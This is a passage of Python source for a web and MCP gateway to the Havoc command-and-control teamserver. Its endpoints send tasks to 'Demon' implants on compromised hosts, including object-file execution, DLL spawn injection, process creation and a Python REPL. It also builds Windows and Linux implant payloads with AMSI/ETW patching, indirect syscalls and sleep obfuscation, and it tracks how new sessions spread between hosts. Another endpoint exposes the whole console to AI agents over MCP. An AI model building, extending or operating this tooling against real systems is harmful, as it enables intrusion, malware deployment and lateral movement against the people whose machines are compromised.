            "Flags": "threaded" if threaded else "non-threaded",
        }
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.new_task(demon, f"inline-execute {obj_path.name}", "20", task_id, note="Python 脚本")
        return web.json_response({"ok": True, "task_id": task_id})

    async def api_python_dll_spawn(self, request: web.Request) -> web.Response:
        """Python 模块 DllSpawn：对应 CommandSend.cc::DllSpawn（INJECT_DLL_SPAWN）。"""
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        demon = str(body.get("demon", ""))
        if demon not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        path = Path(str(body.get("path", "")))
        if not self._script_allowed(path):
            return web.json_response({"error": "forbidden", "message": "DLL 路径越界"}, status=403)
        if not path.is_file():
            return web.json_response({"error": "not_found", "message": "DLL 不存在"}, status=404)
        if path.stat().st_size > 32 * 1024 * 1024:
            return web.json_response({"error": "too_large"}, status=413)
        task_id = str(body.get("task_id") or f"{secrets.randbits(32):08X}")
        info = {
            "TaskID": task_id,
            "CommandLine": f"dll spawn {path}",
            "DemonID": demon,
            "CommandID": "26",
            "Binary": base64.b64encode(path.read_bytes()).decode(),
            "Arguments": str(body.get("args", "")),
        }
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.new_task(demon, f"dll spawn {path.name}", "26", task_id, note="Python 脚本 DllSpawn")
        return web.json_response({"ok": True, "task_id": task_id})

    async def api_python_proc_create(self, request: web.Request) -> web.Response:
        """Python SDK Demon.ProcessCreate：按 teamserver 字段顺序构造 PROC_CREATE。"""
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        demon = str(body.get("demon", ""))
        session = self.state.sessions.get(demon)
        if not session:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        task_id = str(body.get("task_id") or f"{secrets.randbits(32):08X}")
        app = str(body.get("app", ""))
        cmdline = str(body.get("cmdline", ""))
        if not app:
            return web.json_response({"error": "bad_request", "message": "app 不能为空"}, status=400)
        ref = SessionRef(name=demon, os=session.get("os", ""), platform=session.get("platform", ""),
                         arch=session.get("proc_arch", ""),
                         user=session.get("user", ""), host=session.get("host", ""))
        info = build_proc_create(ref, task_id, app, cmdline,
                                 suspended=bool(body.get("suspended", False)),
                                 piped=bool(body.get("piped", True)),
                                 verbose=bool(body.get("verbose", False)))
        try:
            await self.client.send_command(info)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        task = self.state.new_task(demon, info["CommandLine"], str(info["CommandID"]),
                                   task_id, note="Python SDK ProcessCreate")
        return web.json_response({"ok": True, "task": task.to_dict(), "task_id": task_id})

    async def api_python_bof_result(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        task_id = request.query.get("task_id", "")
        result = self.state.python_bof_results.get(task_id)
        if not result:
            return web.json_response({"ok": True, "ready": False})
        return web.json_response({"ok": True, "ready": True, "result": result})

    async def api_python_register(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        script = str(body.get("script", ""))
        if script != "<console>" and not self._script_allowed(Path(script)):
            return web.json_response({"error": "forbidden", "message": "脚本路径越界"}, status=403)
        if body.get("replace"):
            # 原子替换该脚本的旧注册（重新加载时已被脚本移除的命令不能残留）。
            for key, item in list(self.state.python_commands.items()):
                if item.get("script") == script:
                    self.state.python_commands.pop(key, None)
            for key, item in list(self.state.python_modules.items()):
                if item.get("script") == script:
                    self.state.python_modules.pop(key, None)
        commands = body.get("commands") or []
        added = []
        for cmd in commands:
            if not isinstance(cmd, dict):
                continue
            name = str(cmd.get("command", "")).strip()
            if not name:
                continue
            module = str(cmd.get("module", "")).strip()
            key = f"{module} {name}" if module else name
            entry = {
                "key": key,
                "module": module,
                "command": name,
                "function": str(cmd.get("function", "")),
                "description": str(cmd.get("description", "")),
                "usage": str(cmd.get("usage", "")),
                "example": str(cmd.get("example", "")),
                "behavior": cmd.get("behavior", 0),
                "agent": str(cmd.get("agent", "Demon")),
                "script": str(script),
                "loaded": time.time(),
            }
            self.state.python_commands[key] = entry
            added.append(entry)

        modules = body.get("modules") or []
        added_modules = []
        for mod in modules:
            if not isinstance(mod, dict):
                continue
            name = str(mod.get("name", "")).strip()
            if not name:
                continue
            entry = {
                "name": name,
                "description": str(mod.get("description", "")),
                "behavior": str(mod.get("behavior", "")),
                "usage": str(mod.get("usage", "")),
                "example": str(mod.get("example", "")),
                "options": str(mod.get("options", "")),
                "agent": str(mod.get("agent", "Demon")),
                "script": str(script),
                "loaded": time.time(),
            }
            self.state.python_modules[name] = entry
            added_modules.append(entry)

        if added or added_modules or body.get("replace"):
            self._save_python_registry()
            self.state.publish({"type": "python_commands",
                                "commands": list(self.state.python_commands.values()),
                                "modules": list(self.state.python_modules.values())})
            label = "Python 控制台" if script == "<console>" else Path(script).name
            if added:
                self.state.add_event(f"Python 脚本已加载：{label}（注册 {len(added)} 条命令）",
                                     "good", source="python")
            if added_modules:
                self.state.add_event(f"Python 模块已加载：{label}（注册 {len(added_modules)} 个模块）",
                                     "good", source="python")
        return web.json_response({"ok": True, "commands": added, "modules": added_modules})

    def _publish_python_registry(self) -> None:
        self.state.publish({"type": "python_commands",
                            "commands": list(self.state.python_commands.values()),
                            "modules": list(self.state.python_modules.values())})

    async def api_python_autoload(self, request: web.Request) -> web.Response:
        """宿主内 havoc.LoadScript 成功后同步 autoload 列表（不回调宿主）。"""
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        path = Path(str(body.get("path", "")))
        if not self._script_allowed(path):
            return web.json_response({"error": "forbidden", "message": "脚本路径越界"}, status=403)
        enabled = bool(body.get("autoload", True))
        if enabled:
            self._autoload_add(path)
        else:
            self._autoload_remove(path)
        return web.json_response({"ok": True, "path": str(path.resolve()),
                                  "autoload": enabled})

    async def _load_script_path(self, path: Path) -> tuple[int, dict]:
        """通过常驻宿主加载/重新加载脚本（注册原子替换由宿主上报 replace=true 完成）。"""
        if not self.python_enabled:
            return 403, {"error": "disabled", "message": "Python 功能已禁用"}
        if not self._script_allowed(path) or not path.is_file():
            return 403, {"error": "forbidden", "message": "脚本路径无效或越界"}
        key = str(path.resolve())
        async with self.python_lock:
            try:
                result = await self._host_call({"op": "load", "script": key}, timeout=90)
            except Exception as exc:
                return 502, {"error": "host_failed", "message": f"Python 宿主异常：{exc}"}
        if not result.get("ok"):
            return 400, {"error": "load_failed",
                         "message": str(result.get("error") or "脚本加载失败")}
        self._autoload_add(path)
        return 200, {
            "ok": True, "output": result.get("output", ""), "path": key, "autoload": True,
            "commands": [c for c in self.state.python_commands.values()
                         if c.get("script") == key],
            "modules": [m for m in self.state.python_modules.values()
                        if m.get("script") == key],
        }

    async def api_script_load(self, request: web.Request) -> web.Response:
        try:
            body = await request.json()
        except Exception:
            body = {}
        path = Path(str(body.get("path", "")))
        status, payload = await self._load_script_path(path)
        return web.json_response(payload, status=status)

    async def api_script_reload(self, request: web.Request) -> web.Response:
        try:
            body = await request.json()
        except Exception:
            body = {}
        path = Path(str(body.get("path", "")))
        status, payload = await self._load_script_path(path)
        if status == 200:
            payload["reloaded"] = True
        return web.json_response(payload, status=status)

    async def api_script_unload(self, request: web.Request) -> web.Response:
        if not self.python_enabled:
            return web.json_response({"error": "disabled", "message": "Python 功能已禁用"}, status=403)
        try:
            body = await request.json()
        except Exception:
            body = {}
        path = Path(str(body.get("path", "")))
        if not self._script_allowed(path):
            return web.json_response({"error": "forbidden", "message": "脚本路径越界"}, status=403)
        key = str(path.resolve())
        removed_c = [k for k, v in self.state.python_commands.items() if v.get("script") == key]
        removed_m = [k for k, v in self.state.python_modules.items() if v.get("script") == key]
        for k in removed_c:
            self.state.python_commands.pop(k, None)
        for k in removed_m:
            self.state.python_modules.pop(k, None)
        self._autoload_remove(path)
        if self._host_running():
            try:
                await self._host_call({"op": "unload", "script": key}, timeout=15)
            except Exception as exc:
                log.warning("host unload failed: %s", exc)
        if removed_c or removed_m:
            self._save_python_registry()
            self._publish_python_registry()
            self.state.add_event(
                f"Python 脚本已卸载：{path.name}（移除 {len(removed_c)} 条命令 / {len(removed_m)} 个模块）",
                "warn", source="python")
        return web.json_response({"ok": True, "path": key, "removed_commands": removed_c,
                                  "removed_modules": removed_m, "file_deleted": False})

    async def api_script_upload(self, request: web.Request) -> web.Response:
        if not self.python_enabled:
            return web.json_response({"error": "disabled", "message": "Python 功能已禁用"}, status=403)
        length = request.content_length
        if length is not None and length > 2 * 1024 * 1024 + 64 * 1024:
            return web.json_response({"error": "too_large", "message": "脚本不能超过 2MB"}, status=413)
        try:
            reader = await request.multipart()
        except Exception:
            return web.json_response({"error": "bad_request", "message": "需要 multipart/form-data"}, status=400)
        field = None
        while True:
            try:
                part = await reader.next()
            except Exception:
                part = None
            if part is None:
                break
            if part.name == "file":
                field = part
                break
            await part.release()
        if field is None:
            return web.json_response({"error": "bad_request", "message": "缺少 file 字段"}, status=400)
        filename = Path(field.filename or "").name
        if not filename.lower().endswith(".py"):
            return web.json_response({"error": "bad_request", "message": "只允许上传 .py 脚本"}, status=400)
        data = await field.read()
        if len(data) > 2 * 1024 * 1024:
            return web.json_response({"error": "too_large", "message": "脚本不能超过 2MB"}, status=413)
        safe = re.sub(r"[^A-Za-z0-9._\-\u4e00-\u9fff]+", "_", filename).strip("._")
        if not safe.lower().endswith(".py"):
            safe = (safe or "script") + ".py"
        elif safe[-3:] != ".py":
            safe = safe[:-3] + ".py"
        self.uploads_dir.mkdir(parents=True, exist_ok=True)
        target = self.uploads_dir / safe
        if target.exists():
            m = re.match(r"^(.*?)(\.py)$", safe, re.IGNORECASE)
            stem = m.group(1) if m else safe
            target = self.uploads_dir / f"{stem}-{secrets.token_hex(3)}{m.group(2) if m else '.py'}"
        try:
            await asyncio.to_thread(target.write_bytes, data)
        except OSError as exc:
            return web.json_response({"error": "write_failed", "message": str(exc)}, status=500)
        path = str(target.resolve())
        self.state.add_event(f"上传 Python 脚本：{target.name}", "info", source="python")
        return web.json_response({"ok": True, "path": path, "name": target.name,
                                  "size": len(data), "upload": True})

    async def _autoload_registered(self) -> None:
        """网关启动后异步恢复 data/scripts.json 中记录的脚本。"""
        await asyncio.sleep(1.5)
        if not self.python_enabled:
            return
        for raw in list(self.autoload_scripts):
            path = Path(raw)
            # 启动早期网关可能还没开始监听；register.py 的 HTTP 上报需要短暂重试。
            for attempt in range(8):
                status, payload = await self._load_script_path(path)
                if status == 200:
                    log.info("autoload script ok: %s (%d commands)", path, len(payload.get("commands", [])))
                    break
                if attempt == 7:
                    self.state.add_event(
                        f"自动加载脚本失败：{path.name} - {payload.get('message', '')[:300]}",
                        "error", source="python")
                    log.warning("autoload script failed: %s -> %s", path, payload)
                await asyncio.sleep(1.5)

    # ---------------- 常驻 Python 宿主 ----------------

    def _host_running(self) -> bool:
        return self.python_host is not None and self.python_host.returncode is None

    async def _kill_host(self, reason: str = "") -> None:
        proc = self.python_host
        self.python_host = None
        if proc is not None and proc.returncode is None:
            try:
                proc.kill()
            except Exception:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=3)
            except Exception:
                pass
        if self._host_stderr_task:
            self._host_stderr_task.cancel()
            self._host_stderr_task = None
        if reason:
            self.state.add_event(f"Python 宿主已重启：{reason}", "warn", source="python")

    async def _drain_host_stderr(self, proc: asyncio.subprocess.Process) -> None:
        assert proc.stderr is not None
        try:
            while True:
                line = await proc.stderr.readline()
                if not line:
                    break
                text = line.decode("utf-8", "replace").rstrip()
                if text:
                    log.warning("python host stderr: %s", text)
        except asyncio.CancelledError:
            return
        except Exception:
            return

    async def _ensure_host(self) -> asyncio.subprocess.Process:
        if self._host_running():
            return self.python_host  # type: ignore[return-value]
        host_py = self.pysdk_dir / "host.py"
        if not host_py.is_file():
            raise RuntimeError("pysdk/host.py 不存在")
        proc = await asyncio.create_subprocess_exec(
            sys.executable, str(host_py), cwd=str(BASE_DIR), env=self._python_env(),
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE, limit=8 * 1024 * 1024,
        )
        self.python_host = proc
        self._host_stderr_task = asyncio.create_task(self._drain_host_stderr(proc))
        # 控制台 RegisterCommand 只存在于解释器内；宿主（重）启动后旧函数已丢失，
        # 同步清理这些注册，避免 help 里出现调用即失败的幽灵命令。
        stale = [k for k, v in self.state.python_commands.items()
                 if v.get("script") == "<console>"]
        if stale:
            for key in stale:
                self.state.python_commands.pop(key, None)
            self._save_python_registry()
            self._publish_python_registry()
        log.info("python host started pid=%s", proc.pid)
        return proc

    async def _host_call(self, request: dict, timeout: float = 240.0) -> dict:
        """串行地向常驻宿主发送一条 JSONL 请求并等待响应。"""
        if not self.python_enabled:
            raise RuntimeError("Python 功能已禁用")
        async with self.host_lock:
            proc = await self._ensure_host()
            assert proc.stdin is not None and proc.stdout is not None
            try:
                proc.stdin.write((json.dumps(request, ensure_ascii=False) + "\n").encode())
                await proc.stdin.drain()
                line = await asyncio.wait_for(proc.stdout.readline(), timeout=timeout)
            except Exception as exc:
                await self._kill_host(f"{type(exc).__name__}: {exc}")
                raise RuntimeError(f"Python 宿主无响应：{exc}") from exc
            if not line:
                await self._kill_host("宿主进程退出")
                raise RuntimeError("Python 宿主已退出")
            try:
                return json.loads(line.decode("utf-8", "replace"))
            except Exception as exc:
                await self._kill_host("宿主响应不是 JSON")
                raise RuntimeError(f"Python 宿主响应解析失败：{exc}") from exc

    def _note_delivery_command(self, sid: str, line: str, task_id: str = "") -> None:
        """记录一次可能拉起新 agent 的投递命令（供新会话上线时匹配）。"""
        target = delivery_target_from_command(line)
        if not target:
            return
        now = time.time()
        self.delivery_pending = [e for e in self.delivery_pending if now - e["ts"] <= 300]
        self.delivery_pending.append({
            "source": sid,
            "target_ip": target,
            "task_id": str(task_id or ""),
            "command": (line or "")[:1000],
            "ts": now,
        })
        self.delivery_pending = self.delivery_pending[-32:]
        log.info("delivery pending: %s -> %s (task=%s)", sid, target, task_id)

    def _match_delivery_edge(self, demon: str) -> Optional[dict]:
        """新会话上线时，按目标 IP + 300s 时间窗匹配投递命令，写 Web 投递链。"""
        session = self.state.sessions.get(demon)
        if not session:
            return None
        ips = {str(session.get("external_ip") or ""), str(session.get("internal_ip") or "")}
        ips.discard("")
        ips.discard("0.0.0.0")
        if not ips:
            return None
        now = time.time()
        for entry in reversed(self.delivery_pending):
            if now - entry["ts"] > 300:
                continue
            if entry["target_ip"] not in ips or entry["source"] == demon:
                continue
            try:
                record = self.state.set_delivery_edge(
                    demon, entry["source"], command=entry["command"],
                    task_id=entry["task_id"], source="auto")
            except ValueError as exc:
                log.warning("delivery edge match skipped: %s", exc)
                continue
            self.state.add_event(
                f"投递链：{entry['source']} → {demon}（{entry['target_ip']}，task {entry['task_id']}）",
                "info", source="delivery")
            self.delivery_pending = [e for e in self.delivery_pending if e is not entry]
            return record
        return None

    def _on_new_session(self, demon: str) -> None:
        """state 在新会话上线时调用；先匹配投递链，再触发 Python 新会话回调。"""
        try:
            self._match_delivery_edge(demon)
        except Exception:  # noqa: BLE001 - 不能影响 Python 回调/主流程
            log.exception("match delivery edge failed for %s", demon)
        if not self.python_enabled or not self._host_running():
            return
        try:
            asyncio.get_running_loop().create_task(self._python_host_event("new_session", demon))
        except RuntimeError:
            pass

    async def _python_host_event(self, name: str, demon: str) -> None:
        try:
            result = await self._host_call({"op": "event", "name": name, "demon": demon},
                                           timeout=30)
        except Exception as exc:
            log.warning("python host event %s failed: %s", name, exc)
            return
        output = (result.get("output") or "").strip()
        if output:
            self.state.add_event(f"[python {name}] {output[:1000]}", "info", source="python")
        if not result.get("ok"):
            self.state.add_event(f"Python 事件回调异常：{name}", "error", source="python")

    async def api_python_repl(self, request: web.Request) -> web.Response:
        if not self.python_enabled:
            return web.json_response({"error": "disabled", "message": "Python 功能已禁用"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        code = str(body.get("code", ""))
        if not code.strip():
            return web.json_response({"error": "bad_request", "message": "代码为空"}, status=400)
        try:
            data = await self._host_call({"op": "exec", "code": code}, timeout=300)
        except Exception as exc:
            return web.json_response({"error": "repl_failed", "message": str(exc)}, status=502)
        return web.json_response({
            "ok": bool(data.get("ok")),
            "output": data.get("output") or data.get("error") or "",
        })

    def _match_python_command(self, line: str) -> Optional[dict]:
        """匹配客户端模块命令（内置）+ Web 动态注册的脚本命令。"""
        best = None
        candidates = list(self.builtin_commands.values()) + list(self.state.python_commands.values())
        for entry in candidates:
            key = entry.get("key", "")
            if not key:
                continue
            if line == key or line.startswith(key + " "):
                if best is None or len(key) >= len(best["key"]):
                    best = entry
        return best

    async def _run_python_command(self, entry: dict, demon: str, args: list[str]) -> None:
        raw_script = str(entry.get("script", ""))
        if raw_script == "<console>":
            script_key = "<console>"
        else:
            script = Path(raw_script)
            if not script.is_absolute():
                script = BASE_DIR.parent / script
            script_key = str(script.resolve())
        try:
            result = await self._host_call({
                "op": "invoke", "script": script_key,
                "function": entry["function"], "demon": demon, "args": args,
            }, timeout=240)
        except Exception as exc:
            self.state.console_append(demon, "error", f"[python] {exc}")
            self.state.add_event(f"Python 命令异常：{entry['key']} - {exc}", "error", source="python")
            return
        text = str(result.get("output") or "").strip()
        if text:
            for line in text.splitlines()[:80]:
                self.state.console_append(demon, "info" if result.get("ok") else "error",
                                          f"[python] {line}")
        if not result.get("ok"):
            self.state.add_event(f"Python 命令失败：{entry['key']}", "error", source="python")


    # ---------------- 载荷生成 ----------------

    async def api_payload_build(self, request: web.Request) -> web.Response:
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        if self.state.active_build:
            return web.json_response({"error": "busy", "message": "已有载荷正在构建，请稍候"}, status=409)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)

        listener_name = str(body.get("listener", "")).strip()
        listener = self.state.listeners.get(listener_name)
        if not listener:
            return web.json_response({"error": "bad_request", "message": "监听器不存在"}, status=400)
        if listener.get("kind") == "transport":
            return web.json_response({
                "error": "bad_request",
                "message": "传输监听器不直接生成 Demon 载荷：请先下载中继器，并创建 HTTP 代理监听器后生成载荷",
            }, status=400)
        if str(listener.get("protocol", "")).lower() == "external":
            return web.json_response({
                "error": "bad_request",
                "message": "External 监听器用于第三方 C2/自定义 Agent，不能生成 Demon 载荷",
            }, status=400)
        if str(listener.get("status", "")).lower() != "online":
            return web.json_response({"error": "bad_request", "message": "监听器不在线"}, status=400)
        if str(listener.get("protocol", "")).lower() == "smb" and str(body.get("format", "")) == "Linux Exe":
            return web.json_response({
                "error": "bad_request",
                "message": "Linux Demon 不支持 SMB pivot 监听器（依赖 Windows 命名管道）：请选 HTTP/HTTPS，"
                           "或先建传输监听器 + 带 127.0.0.1:1080 代理的 HTTP 监听器",
            }, status=400)

        arch = str(body.get("arch", "x64"))
        fmt = str(body.get("format", "Windows Exe"))
        if arch not in ("x64", "x86"):
            return web.json_response({"error": "bad_request", "message": "架构无效"}, status=400)
        if fmt not in ("Windows Exe", "Windows Dll", "Windows Shellcode", "Windows Service Exe",
                       "Linux Exe"):
            return web.json_response({"error": "bad_request", "message": "格式无效"}, status=400)
        is_linux = fmt == "Linux Exe"

        raw_cfg = body.get("config") or {}
        if not isinstance(raw_cfg, dict):
            return web.json_response({"error": "bad_request", "message": "配置无效"}, status=400)
        try:
            sleep = int(str(raw_cfg.get("sleep", "2")))
            jitter = int(str(raw_cfg.get("jitter", "15")))
        except ValueError:
            return web.json_response({"error": "bad_request", "message": "Sleep/Jitter 必须是整数"}, status=400)
        if sleep < 0 or not (0 <= jitter <= 100):
            return web.json_response({"error": "bad_request", "message": "Sleep/Jitter 越界"}, status=400)

        spawn64 = str(raw_cfg.get("spawn64", "")).strip()
        spawn32 = str(raw_cfg.get("spawn32", "")).strip()
        if not is_linux and (not spawn64 or not spawn32):
            return web.json_response({"error": "bad_request", "message": "Spawn64/Spawn32 不能为空"}, status=400)

        cfg = {
            "Sleep": str(sleep),
            "Jitter": str(jitter),
            "Indirect Syscall": bool(raw_cfg.get("indirect", False)),
            "Sleep Technique": str(raw_cfg.get("sleep_technique", "WaitForSingleObjectEx")),
            "Sleep Jmp Gadget": str(raw_cfg.get("sleep_jmp", "None")),
            "Stack Duplication": bool(raw_cfg.get("stack", False)),
            "Proxy Loading": str(raw_cfg.get("proxy", "None (LdrLoadDll)")),
            "Amsi/Etw Patch": str(raw_cfg.get("amsi", "None")),
            "Injection": {
                "Alloc": str(raw_cfg.get("alloc", "Native/Syscall")),
                "Execute": str(raw_cfg.get("execute", "Native/Syscall")),
                "Spawn64": spawn64,
                "Spawn32": spawn32,
            },
        }
        if fmt == "Windows Service Exe":
            cfg["Service Name"] = str(raw_cfg.get("service_name", "")).strip()

        build = self.state.begin_payload_build({
            "agent": "Demon", "listener": listener_name, "arch": arch, "format": fmt,
        })
        info = {
            "AgentType": "Demon",
            "Listener": listener_name,
            "Arch": arch,
            "Format": fmt,
            "Config": json.dumps(cfg, ensure_ascii=False),
        }
        try:
            await self.client.send_package(5, 2, info, one_time=True)
        except Exception as exc:
            self.state.fail_payload_build(str(exc))
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        log.info("payload build started id=%s %s %s listener=%s", build["id"], fmt, arch, listener_name)
        return web.json_response({"ok": True, "build": build})

    async def api_payloads(self, request: web.Request) -> web.Response:
        return web.json_response({"builds": list(self.state.payload_builds.values())[-20:],
                                  "active": self.state.active_build})

    async def api_payload_download(self, request: web.Request) -> web.Response:
        build_id = request.match_info["bid"]
        build = self.state.payload_builds.get(build_id)
        if not build or build.get("status") != "done" or not build.get("path"):
            return web.json_response({"error": "not_found", "message": "载荷不存在或尚未构建完成"}, status=404)
        path = Path(build["path"]).resolve()
        try:
            path.relative_to(self.state.payload_dir.resolve())
        except ValueError:
            return web.json_response({"error": "forbidden"}, status=403)
        if not path.is_file():
            return web.json_response({"error": "not_found"}, status=404)
        return web.FileResponse(path, headers={
            "Cache-Control": "no-store",
            "Content-Disposition": f'attachment; filename="{build["filename"]}"',
        })

    async def api_profile(self, request: web.Request) -> web.Response:
        return web.json_response({"profile": self.state.profile,
                                  "teamserver": self.state.connection_view()})

    async def api_files_cache(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        return web.json_response(self.state.files.get(sid) or {"path": "", "entries": []})

    async def api_procs_cache(self, request: web.Request) -> web.Response:
        sid = request.match_info["sid"]
        return web.json_response(self.state.processes.get(sid) or {"entries": []})

    # ---------------- WebSocket ----------------

    async def ws_handler(self, request: web.Request) -> web.StreamResponse:
        ws = web.WebSocketResponse(heartbeat=30)
        await ws.prepare(request)
        self.ws_clients.add(ws)
        queue = self.state.subscribe()
        log.info("browser ws connected from %s (total=%d)", request.remote, len(self.ws_clients))
        try:
            await ws.send_json(self.state.snapshot())
            relay = asyncio.create_task(self._relay(ws, queue))
            reader = asyncio.create_task(self._ws_reader(ws))
            done, pending = await asyncio.wait({relay, reader}, return_when=asyncio.FIRST_COMPLETED)
            for task in pending:
                task.cancel()
        finally:
            self.state.unsubscribe(queue)
            self.ws_clients.discard(ws)
            log.info("browser ws disconnected (total=%d)", len(self.ws_clients))
        return ws

    async def _relay(self, ws: web.WebSocketResponse, queue: asyncio.Queue) -> None:
        last_status = 0.0
        while not ws.closed:
            try:
                message = await asyncio.wait_for(queue.get(), timeout=5)
            except asyncio.TimeoutError:
                message = None
            if message is not None:
                try:
                    await ws.send_json(message)
                except Exception:
                    break
            if time.time() - last_status >= 5:
                last_status = time.time()
                try:
                    view = self.state.connection_view()
                    view["counts"] = self.state.counts()
                    await ws.send_json({"type": "status", "connection": view,
                                        "server_time": now_ts()})
                except Exception:
                    break

    async def _ws_reader(self, ws: web.WebSocketResponse) -> None:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    payload = json.loads(msg.data)
                except Exception:
                    continue
                if payload.get("type") == "ping":
                    await ws.send_json({"type": "pong", "server_time": now_ts()})
            elif msg.type == WSMsgType.ERROR:
                break

    # ---------------- 后台 ----------------

    async def _pruner(self) -> None:
        tick = 0
        while True:
            await asyncio.sleep(5)
            tick += 5
            if tick % 300 == 0:
                self.auth.prune()
            active = self.state.active_build
            if active:
                build = self.state.payload_builds.get(active)
                if build and now_ts() - build.get("started", now_ts()) > 300:
                    self.state.fail_payload_build("构建超时（300 秒），请查看 teamserver 日志")

            # 刷新会话健康度：静默超过宽限期就显示“迟滞”，不依赖下一条回调
            for session in self.state.sessions.values():
                health = self.state.compute_health(session)
                if health != session.get("health"):
                    session["health"] = health
                    self.state.publish({"type": "session", "action": "update", "session": session})

    async def start_background(self, app: web.Application) -> None:
        self.client.start()
        self.fileman.start()
        self._bg_tasks.append(asyncio.create_task(self._pruner()))
        self._bg_tasks.append(asyncio.create_task(self._autoload_registered()))
        await self.transports.start_all()
        log.info("gateway started; teamserver=%s; transports=%d",
                 self.client.url, len(self.transports.servers))

    async def stop_background(self, app: web.Application) -> None:
        for task in self._bg_tasks:
            task.cancel()
        await self.fileman.stop()
        if self.python_host is not None and self.python_host.returncode is None:
            try:
                self.python_host.terminate()
                await asyncio.wait_for(self.python_host.wait(), timeout=3)
            except Exception:
                try:
                    self.python_host.kill()
                except Exception:
                    pass
        if self._host_stderr_task:
            self._host_stderr_task.cancel()
        if self.repl_proc and self.repl_proc.returncode is None:
            try:
                self.repl_proc.terminate()
                await asyncio.wait_for(self.repl_proc.wait(), timeout=3)
            except Exception:
                try:
                    self.repl_proc.kill()
                except Exception:
                    pass
        await self.transports.stop_all()
        await self.client.stop()


def _self_base_url(cfg: dict) -> str:
    """网关调用自身 REST API 的地址（MCP 桥接使用）。"""
    web_cfg = cfg.get("web") or {}
    host = str(web_cfg.get("host") or "0.0.0.0")
    if host in ("0.0.0.0", "::", "[::]", ""):
        host = "127.0.0.1"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    scheme = "https" if (web_cfg.get("tls_cert") and web_cfg.get("tls_key")) else "http"
    return f"{scheme}://{host}:{int(web_cfg.get('port', 8081))}"


class MCPPortListener:
    """独立 MCP 端口的 aiohttp 监听器，可在运行中重新绑定。"""

    def __init__(self, gw: Gateway, host: str, ssl_context: Any = None):
        self.gw = gw
        self.host = host or "0.0.0.0"
        self.ssl_context = ssl_context
        self.runner: Optional[web.AppRunner] = None
        self.site: Optional[web.TCPSite] = None
        self.port = 0

    async def _start(self, port: int) -> None:
        app = build_mcp_only_app(self.gw)
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, self.host, port, ssl_context=self.ssl_context)
        try:
            await site.start()
        except Exception:
            await runner.cleanup()
            raise
        self.runner = runner
        self.site = site
        self.port = port

    async def stop(self) -> None:
        runner = self.runner
        self.runner = None
        self.site = None
        self.port = 0
        if runner is not None:
            try:
                await runner.cleanup()
            except Exception as exc:  # noqa: BLE001
                log.warning("清理 MCP 独立监听失败：%s", exc)

    async def apply(self, port: int) -> None:
        """把监听切到 port；0 表示关闭独立监听。绑定失败时恢复旧端口。"""
        if port == self.port and (port == 0 or self.runner is not None):
            return
        old_port = self.port
        await self.stop()
        if port <= 0:
            return
        try:
            await self._start(port)
        except Exception:  # noqa: BLE001  —— 新端口失败时恢复旧端口
            if old_port > 0:
                try:
                    await self._start(old_port)
                except Exception:  # noqa: BLE001
                    pass
            raise


def build_mcp_only_app(gw: Gateway) -> web.Application:
    """独立端口应用：只暴露 /mcp，复用同一 MCPBridge 与令牌鉴权。"""
    if gw.mcp_bridge is None:
        raise RuntimeError("MCP bridge 未初始化")
    app = web.Application(
        middlewares=[gw.security_middleware, gw.mcp_listener_middleware],
        client_max_size=128 * 1024 * 1024,
    )
    bridge = gw.mcp_bridge
    app["gateway"] = gw
    app["mcp_bridge"] = bridge
    app.router.add_post("/mcp", bridge.handle_post)
    app.router.add_get("/mcp", bridge.handle_get)
    app.router.add_delete("/mcp", bridge.handle_delete)
    app.router.add_options("/mcp", bridge.handle_options)
    return app


def build_app(cfg: dict, config_path: Optional[Path] = None) -> web.Application:
    gw = Gateway(cfg, config_path=config_path)
    app = web.Application(middlewares=[gw.security_middleware, gw.auth_middleware],
                      client_max_size=128 * 1024 * 1024)
    app["gateway"] = gw
    if gw.mcp_enabled:
        # MCP 通过回环 REST 调用复用全部既有处理器：鉴权、审计、状态与浏览器一致。
        override = str(gw.mcp_cfg.get("gateway_url") or "").strip()
        bridge = MCPBridge(override or _self_base_url(cfg), gw.mcp_token,
                           insecure=bool((cfg.get("web") or {}).get("tls_cert")))
        bridge.explicit_base = bool(override)
        # 恢复持久化运行态：路由始终挂载，用 bridge.running 做 gate。
        bridge.running = bool(gw.mcp_running)
        bridge.started_at = gw.mcp_started_at if gw.mcp_running else 0.0
        gw.mcp_bridge = bridge
        app["mcp_bridge"] = bridge
        app.router.add_post("/mcp", bridge.handle_post)
        app.router.add_get("/mcp", bridge.handle_get)
        app.router.add_delete("/mcp", bridge.handle_delete)
        app.router.add_options("/mcp", bridge.handle_options)
